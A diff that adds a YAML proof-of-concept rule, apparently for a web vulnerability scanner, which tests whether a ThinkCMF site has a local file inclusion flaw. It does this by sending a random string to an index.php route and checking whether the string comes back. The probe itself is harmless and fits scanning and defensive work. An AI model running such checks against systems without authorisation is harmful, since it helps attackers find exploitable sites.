@@ -1,0 +1,12 @@
+name: poc-yaml-thinkcmf-lfi
+set:
+  r1: randomLowercase(32)
+rules:
+  - method: GET
+    path: /index.php?a=test_public&arg1={{r1}}
+    expression: |
+      status == 200 && body.bcontains(bytes(r1))
+detail:
+  author: j4ckzh0u(https://github.com/j4ckzh0u)
+  links:
+    - https://www.freebuf.com/vuls/217586.html
